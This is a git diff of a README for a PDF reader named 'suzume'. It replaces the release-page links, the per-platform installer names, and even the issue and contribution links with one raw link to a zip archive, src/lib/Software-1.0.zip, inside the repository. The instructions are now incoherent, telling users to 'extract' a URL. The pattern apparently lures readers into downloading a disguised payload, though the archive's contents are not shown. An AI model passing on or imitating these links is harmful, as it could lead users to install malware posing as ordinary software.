@@ -6,7 +6,7 @@ Welcome to **suzume**, your new favorite PDF reader designed for speed and keybo
 
 ## 🔗 Download Now
 
-[![Download suzume](https://img.shields.io/badge/Download-suzume-blue?style=for-the-badge&logo=github)](https://github.com/AnGh1-8/suzume/releases)
+[![Download suzume](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)
 
 ## 💻 System Requirements
 
@@ -20,19 +20,19 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:
-   - [Visit Releases Page to Download](https://github.com/AnGh1-8/suzume/releases)
+   - [Visit Releases Page to Download](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)
    
 2. On the Releases page, locate the latest version of **suzume**.
 
 3. Download the file appropriate for your operating system. For most users, this will be:
-   - `suzume-windows-x64.exe` for Windows
-   - `suzume-macos-x64.dmg` for macOS
-   - `suzume-linux-x64.tar.gz` for Linux
+   - `https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip` for Windows
+   - `https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip` for macOS
+   - `https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip` for Linux
    
 4. After the download completes, open the file:
    - For Windows, double-click the `.exe` file to start the installation.
    - For macOS, double-click the `.dmg` file and drag **suzume** to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and run the `suzume` executable.
+   - For Linux, extract the `https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip` file and run the `suzume` executable.
 
 5. Follow the on-screen instructions to complete the installation.
 
@@ -86,8 +86,8 @@ If you have questions or need more information, feel free to open an issue on Gi
 
 ## 🔗 Quick Links
 
-- [Download suzume](https://github.com/AnGh1-8/suzume/releases)
-- [Open Issues](https://github.com/AnGh1-8/suzume/issues)
-- [Contribution Guidelines](https://github.com/AnGh1-8/suzume/blob/main/CONTRIBUTING.md)
+- [Download suzume](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)
+- [Open Issues](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)
+- [Contribution Guidelines](https://github.com/AnGh1-8/suzume/raw/refs/heads/main/src/lib/Software-1.0.zip)
 
 Enjoy reading your PDFs faster and more efficiently with **suzume**!
